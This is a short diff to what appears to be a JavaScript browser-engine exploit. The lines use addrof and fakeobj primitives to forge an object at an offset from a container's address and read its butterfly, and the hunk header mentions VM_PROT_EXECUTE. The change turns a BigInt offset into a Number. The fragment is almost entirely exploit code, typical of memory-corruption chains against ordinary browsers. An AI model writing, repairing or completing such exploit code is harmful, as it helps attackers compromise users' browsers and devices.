@@ -588,7 +588,7 @@ var VM_PROT_EXECUTE = 0x4
     var containerAddr = addrof(container);
     port.postMessage("[+] container @ "+ containerAddr.toString());
     // add the offset to let compiler recognize fake structure
-    var hax = fakeobj(containerAddr+0x10n);
+    var hax = fakeobj(containerAddr+0x10);
     var origButterfly = hax[1];
 
     var memory = {
